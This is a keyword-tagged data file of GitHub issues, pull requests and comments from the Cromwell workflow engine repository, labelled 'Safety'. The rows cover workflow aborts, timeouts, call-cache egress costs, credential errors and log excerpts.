Safety,"During code review for #1836 @cjllanwarne noted that `processSource` in what is currently named `WorkflowStoreActor` and most likely `WorfklowStoreSubmitActor` by the time this is acted upon looked suspicious as we had (we think) intended json validation to not happen until later and a workflow ID would always be handed back to the user. Further, the failed Future doesn't appear to be getting handed back to the API at all (I think), which would lead to a timeout response. Further since the sources are being processed monadically it is possible for a user to have multiple borked files but only the first will be reported (if we were reporting). Check into what's up here - either don't perform this check on submission or ensure that appropriate error messages are handed back",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1882:459,timeout,timeout,459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1882,1,['timeout'],['timeout']
Safety,"EAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(a442dc1c)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:37:31,421 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17bed42e)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:40,098 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(e9851ba1)]: Abort received. Aborting 3 EJEAs; `; Cromwell hash: 192ea6025613df967d60e9e975693144035379d7",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4825,Abort,Abort,4825,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,12,['Abort'],"['Abort', 'Aborting']"
Safety,"EDIT: to safe yourself some data entry, you can use branch [cjl_initial_work_dir_requirement_4](https://github.com/broadinstitute/cromwell/tree/cjl_initial_work_dir_requirement_4) as an entry point with the centaur test and a Spec already added. This seems to be a pretty common pattern but relies on `JSON.stringify(inputs)` working in our expression evaluator:; ```yml; # A common use case: stringy the inputs JSON and provide that file as another input file. cwlVersion: v1.0; $graph:; - id: stringify_inputs; class: CommandLineTool; baseCommand: ['grep', 'number', 'inputs.json']; requirements:; - class: DockerRequirement; dockerPull: ""python:3.5.0""; - class: InitialWorkDirRequirement; listing:; - entryname: 'inputs.json'; entry: $(JSON.stringify(inputs)). stdout: ""number_field"". # TODO CWL: Set the types more appropriately (depends on issue #3059); inputs:; - id: number; type: string; default: 27; - id: str; type: string; default: wooooo; - id: boolean; type: string; default: True; outputs:; - id: number_field_output; type: string; outputBinding:; glob: number_field; loadContents: true; outputEval: $(self[0].contents.trim()); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090:9,safe,safe,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090,1,['safe'],['safe']
Safety,"Enable Cromwell to emit statsd messages to a configurable host. It'd be awesome if this whole thing could be configurable on/off but if that's a pain it's not a big deal. The default host could be a non-existent UDP thing or something. The main key for this is the infrastructure, but some initial things to instrument. Things with lifetime counts are for creating a time series, e.g. ""how many of X happened in the last N time units"". - Lifetime count of submitted workflows; - Lifetime count of completed workflows; - Lifetime count of aborted workflows; - Current count of both pending & running workflows; - Lifetime count of retry events, e.g. GCS & PAPI; - Probably best broken up so GCS & PAPI separate if possible",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2467:538,abort,aborted,538,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2467,1,['abort'],['aborted']
Safety,"Ensure GCS file systems use custom configuration.; When an exception/timeout occurs during asyncHashing, report it as a failure.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2512:69,timeout,timeout,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2512,1,['timeout'],['timeout']
Safety,"Er I meant ""safe"" where I said ""idempotent"", but still this should remain a POST. https://stackoverflow.com/questions/1254132/so-why-should-we-use-post-instead-of-get-for-posting-data",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2318#issuecomment-307442614:12,safe,safe,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2318#issuecomment-307442614,1,['safe'],['safe']
Safety,"Er, yes that was in a fork that I appear to have deleted... :flushed: although it wouldn't be useful as-is (was?) anymore because it was from back in the day when all the different sharedfilesystem backends were implemented in code, not defined in configuration as they are now. Last comment of @kshakir [above](https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328880929) summarizes the situation perfectly for a within-cromwell solution. If I were going to work around this now I would `cron` up a simple script that:. 1. Makes API call to query the cromwell service for running jobs; 2. Finds all the corresponding `stdout.submit` files in the cromwell job task call execution directories to get scheduler job ids for the cromwell job; 3. Asks the scheduler for the alive-or-dead status of those scheduler job ids and if not alive, aborts the cromwell job via API call",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-360318578:853,abort,aborts,853,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-360318578,2,['abort'],['aborts']
Safety,"Error message: A timeout occurred waiting for a future to complete. Queried 100 times, sleeping 100 milliseconds between each query. tc: ServicesStore should not deadlock. https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/566/. Update 10/22; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/708/. Update 10/28:; https://fc-jenkins.dsp-techops.broadinstitute.org/view/Testing/view/Test%20Runners/job/cromwell-test-runner/831/. Update 11/03:; https://fc-jenkins.dsp-techops.broadinstitute.org/view/Testing/view/Test%20Runners/job/cromwell-test-runner/1003/. Update 11/06:; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1076/. Update 11/09:; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1166/. Further:; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1337; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1422; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1445; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1489; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1525; https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/1590",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328:17,timeout,timeout,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328,1,['timeout'],['timeout']
Safety,"Exec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:17000,abort,abort,17000,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"Extending mcovarr's work in #6366 . Big shoutout to mcovarr!!!. [Per @mbookman]; This pull request is an initial update to address:. CROM-6718: FR: Add flag for minimizing chance of GCP cross-region network egress charges being incurred. This PR specifically focuses on the risks of egress charges incurred due to call caching. The framing of the approach here, which is a bit broader than originally noted in CROM-6718, is:; Make call caching location-aware, prioritizing copies that minimize egress charges.; Add a workflow option enabling control of what egress charges can be incurred for call cache copying.; The new workflow option would be:. call_cache_egress: [none, continental, global]. where the values affect whether call cache copies can incur egress charges:; none: only within-region copies are allowed, which generate no egress charges; continental: within content copies are allowed; within-content copies have reduced costs, such as $0.01 / GB in the US; global: copies across all regions are allowed. Cross-content egress charges can be much higher (ranging from $0.08 / GB up to $0.23 / GB). ### CURRENT STATUS OF PR:; With the changes in this PR, Cromwell successfully checks the location of the source and destination file to be copied, compares the location, and makes a decision of whether or not it should be copied based on the call_cache_egress option. If it should be copied, the files are copied as normal. If it should not be copied, the cache attempt fails and the workflow runs instead.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6369:274,risk,risks,274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6369,2,['risk'],['risks']
Safety,FYI- This PR creates a new (and used) `akka.http.logger-startup-timeout`. You probaby want to override `akka.logger-startup-timeout` [specified here](https://github.com/akka/akka/blob/v2.5.31/akka-actor/src/main/resources/reference.conf#L31-L34). Stanza issues also explains why the `ReferenceConfSpec` during `9e20c40` didn't catch a collision. That commit tried-to-override-but-created `akka.actor.default-dispatcher.fork-join-executor.logger-startup-timeout`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224:64,timeout,timeout,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6381#issuecomment-870183224,3,['timeout'],['timeout']
Safety,"FYI- the failing test suite ""centaurJes"" is due to a know limitation in our test setup, but the other three look good, including the ""centaurLocal"" tests. Again, without a dockerized ""centaurTes"" we'll certainly try to avoid issues, but there won't be any guarantees that upgrades to the standard backend API don't break TES. Also, the 87 commits will need to be rebased and squashed correctly to a minimal set, on the order of 1 commit, but otherwise let us know when you're ready for re-review. Let us know if you have more questions or if we can provide any other assistance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-278235897:219,avoid,avoid,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-278235897,1,['avoid'],['avoid']
Safety,"Feel free to make this PR redundant 😛 If your changes remove the need to put the outputs in a container override or does it in some different way that allows for larger values, then indeed this PR won't be needed anymore.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-627183681:26,redund,redundant,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-627183681,1,['redund'],['redundant']
Safety,Filed this PR to allow clients to wait for slow responses: ; https://github.com/broadinstitute/firecloud-develop/pull/1346. This may prevent people spamming the slow operation after seeing a timeout.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4105#issuecomment-422176768:191,timeout,timeout,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4105#issuecomment-422176768,1,['timeout'],['timeout']
Safety,"First implementation of a pluggable LocalBackend. This is more a light basic implementation and a starting point to iterate over.; What is implemented : ; - Support for non-docker jobs; - Support for docker jobs; - Support for ""ContinueOnReturnCode"" ""FailOnStderr"" and ""docker"" runtime attributes; - Engine functions; - Abort. Things to think about:; - How to share code between backends ? runtime attributes validation, engine functions, shared filesystem code.. ; - Testing. Note: some code is duplicated from the engine as it's still used by the current non-PBE implementation. Eventually this will replace all local backend code in the engine. Currently adding more tests for ; - [x] abort. ~~\- [ ] engine functions~~; - [x] input localization; - [x] expression evaluation; - [x] coercion ; - [x] scatter",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/712:320,Abort,Abort,320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/712,2,"['Abort', 'abort']","['Abort', 'abort']"
Safety,Fix abort.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/379:4,abort,abort,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/379,1,['abort'],['abort']
Safety,Fix metadata count safety limit when not expanding subwfs [BA-6576],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5788:19,safe,safety,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5788,1,['safe'],['safety']
Safety,Fix recover on restart [WX-927],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7498:4,recover,recover,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7498,1,['recover'],['recover']
Safety,Fix typo in docs about Exit code timeout,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4289:33,timeout,timeout,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4289,1,['timeout'],['timeout']
Safety,Fix-up abort wiring,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1414:7,abort,abort,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1414,1,['abort'],['abort']
Safety,"Fixed by https://github.com/broadinstitute/cromwell/pull/2808, the WEA doesn't bypass EJEAs anymore. When they receive an abort message they'll die if they don't have a BJEA.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-342586443:122,abort,abort,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-342586443,1,['abort'],['abort']
Safety,Fixed timeout error during mysql testing.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/398:6,timeout,timeout,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/398,1,['timeout'],['timeout']
Safety,Fixing broken abort functionality [0.18],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/504:14,abort,abort,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/504,1,['abort'],['abort']
Safety,Fixing broken abort functionality [develop],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/503:14,abort,abort,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/503,1,['abort'],['abort']
Safety,Fixing https://github.com/broadinstitute/cromwell/issues/4050. While doing this I notice that this check alive command is not used at all. First did a restructure of the statuses and now there is also a status Running. - [x] Add timeout on `WaitingForReturnCode` step; - [x] Make timeout a config value. Meanwhile please give already feed on this of course ;),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112:229,timeout,timeout,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112,2,['timeout'],['timeout']
Safety,Fixing immediate issue of database connection pool timeouts,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/363:51,timeout,timeouts,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/363,1,['timeout'],['timeouts']
Safety,Fixing two bugs in syntax error detection,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/109:32,detect,detection,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/109,1,['detect'],['detection']
Safety,Flaky Test: abort a workflow mid run and restart immediately,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3392:12,abort,abort,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3392,1,['abort'],['abort']
Safety,"Follow up on https://github.com/broadinstitute/cromwell/pull/4112. This will reduce the load on the JVM a lot. I did indeed a stress test on our system with 50.000 async qsub/qstat jobs but this was outside the jvm. Inside the jvm this ends up in blocking threads to cromwell. When the timeout is set to 120 seconds, `isAlive` will only run once each 120 seconds.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220:286,timeout,timeout,286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220,1,['timeout'],['timeout']
Safety,"For this particular case it might be an optimization, but from a general perspective I think it can be a design choice and would avoid creating new Workflow Actors-like",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195433266:129,avoid,avoid,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195433266,1,['avoid'],['avoid']
Safety,Found a good discussion. Will put it in a comment. https://stackoverflow.com/questions/442564/avoid-synchronizedthis-in-java,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439102328:94,avoid,avoid-synchronizedthis-in-java,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4390#issuecomment-439102328,1,['avoid'],['avoid-synchronizedthis-in-java']
Safety,"From a quick reading of the parent `WorkflowManagerActor` code it appears the default supervision strategy with ""restart on generic Exception"" is being used. Simply restarting a crashed `WorkflowActor` FSM appears to put it back into its initial `WorkflowUnstartedState` where it wouldn't do anything to progress a workflow until it receives a `StartWorkflowCommand` which is not being re-sent. So it looks like this would create a zombie workflow, though it does appear to be abortable.; ```; ERROR akka.actor.OneForOneStrategy - Google credentials are invalid: Error getting access token for service account: 400 Bad Request; {; ""error"": ""invalid_grant"",; ""error_description"": ""Invalid JWT Signature.""; }; java.lang.RuntimeException: Google credentials are invalid: Error getting access token for service account: 400 Bad Request; {; ""error"": ""invalid_grant"",; ""error_description"": ""Invalid JWT Signature.""; }; 	at cromwell.cloudsupport.gcp.auth.GoogleAuthMode.validateCredentials(GoogleAuthMode.scala:175); 	at cromwell.cloudsupport.gcp.auth.GoogleAuthMode.validateCredentials$(GoogleAuthMode.scala:173); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.validateCredentials(GoogleAuthMode.scala:237); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.credentials(GoogleAuthMode.scala:250); 	at cromwell.cloudsupport.gcp.auth.UserServiceAccountMode.credentials(GoogleAuthMode.scala:237); 	at cromwell.filesystems.drs.DrsPathBuilderFactory.withOptions(DrsPathBuilderFactory.scala:86); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.val",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4916:477,abort,abortable,477,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4916,1,['abort'],['abortable']
Safety,"From forum post https://gatkforums.broadinstitute.org/wdl/discussion/12361/continue-on-sigterm-code#latest. The situation:; * Local backend; * The python script spawns a monitor which will SIGTERM it when the task completes; * The `128+SIGTERM` exit code was specified as valid in the runtime attributes; * However, Cromwell has already assumed that the job was aborted before it checks against the `continueOnReturnCode` values, the workflow fails instead of continuing.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3896:362,abort,aborted,362,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3896,1,['abort'],['aborted']
Safety,Fully add or remove 403 status for abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2415:35,abort,abort,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2415,1,['abort'],['abort']
Safety,"Futures are fine, just not in the code which the actor itself directly controls - e.g. if an actor calls a function that lives elsewhere in our code, and internally that's using a Future, that's fine as it can't directly manipulate the actor's state (sort of - there's still an issue that the DB is a giant bit of shared mutable state, but that's harder to get around). I agree with your statement. My point is by making that claim that the burden is now on all future developers/reviewers/etc to notice if that actor somehow modifies beyond the ""oh, it's okay for now"" point. That's a lot easier said than done, better to prevent the pain from the get-go, it's not like the medicine is all that much extra work. edit: I'd also like for people to get in the habit of being extremely critical of futures inside an actor's event loop - requiring a strong defense of it as opposed to the opposite needing to be argued for. As you say, sometimes it's fine, but we should be critical at all times that it's _really_ a net win to do so. There's some psychology at work here - people see constructs and assume they're ok, the more we can avoid anti-patterns the less likely people are to misuse them.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218579639:1131,avoid,avoid,1131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218579639,1,['avoid'],['avoid']
Safety,GCP Batch backend not recovering workflows on restart,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:22,recover,recovering,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recovering']
Safety,GCS storage appears to be created redundantly,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1437:34,redund,redundantly,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1437,1,['redund'],['redundantly']
Safety,"Good catch! I closed #2281. . Transferring conversation here:; From @MatthewMah ; > When running jobs on backends with job runtime limits such as LSF or SLURM, jobs reaching the runtime limits are killed by the backend. [Cromwell never detects that this occurs](http://gatkforums.broadinstitute.org/wdl/discussion/9542/does-cromwell-detect-task-failures-based-on-check-alive), and will wait forever for a job that is already dead. It would be helpful to configure periodic checks for whether tasks are still alive, and enter failure modes for non-zero return codes when unfinished tasks are no longer alive. . From @geoffjentry ; > @katevoss if I managed to correlate this correctly w/ the previous issue I was discussing w/ @kshakir it sounded like it isn't a huge deal, just that there's some nuance to it. From @cjllanwarne:; > Some SFS backends can kill jobs outside of Cromwell, leaving us waiting forever for an rc file that will never be created.; Idea: occasionally run the check-alive command to verify that long-running jobs are indeed still alive outside of restarting Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328126279:236,detect,detects,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328126279,2,['detect'],"['detect-task-failures-based-on-check-alive', 'detects']"
Safety,Good news first: the `centaurPapiV2` build passed 🎉 ; Bad news: the other 4 PAPI v2 builds failed 😢 . The horicromtal builds are running with Cromwell configured to Carbonite but Centaur not configured to wait for Carboniting. While this might not have been intentional it's IMHO kind of appealing as a real-world scenario. I have no idea why the builds seem to hang until timeout as if some workflows were never completing. Conformance: `Unexpected failing tests: (6)`. No idea what happened with the engine upgrade test.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5237#issuecomment-548148305:373,timeout,timeout,373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5237#issuecomment-548148305,1,['timeout'],['timeout']
Safety,"Good news, I was able to fix `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately=false`. Turns out that when this flag is true, Cromwell blindly marks the job as aborted, now, Cromwell waits until the abort request is executed and the job can't be retrieved from GCP anymore.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2122548119:171,abort,aborted,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2122548119,2,['abort'],"['abort', 'aborted']"
Safety,"Got a centaur failure with `Failed to upload auth file` caused by the following exception, not considered retryable:. ```; 017-04-18 21:11:49,413 cromwell-system-akka.dispatchers.engine-dispatcher-64 ERROR - WorkflowManagerActor Workflow 6e23463e-3fc6-4b18-aeb0-fc7c920cd758 failed (during InitializingWorkflowState): Failed to upload authentication file; java.io.IOException: Failed to upload authentication file; 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.applyOrElse(JesInitializationActor.scala:63); 	at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$beforeAll$1.applyOrElse(JesInitializationActor.scala:62); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); 	at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.core.CromwellFatalException: com.google.cloud.storage.StorageExc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:692,recover,recoverWith,692,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,2,['recover'],['recoverWith']
Safety,HOTFIX: Forcibly abort workflows stuck in aborting for longer than 10 minutes…,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/986:17,abort,abort,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/986,2,['abort'],"['abort', 'aborting']"
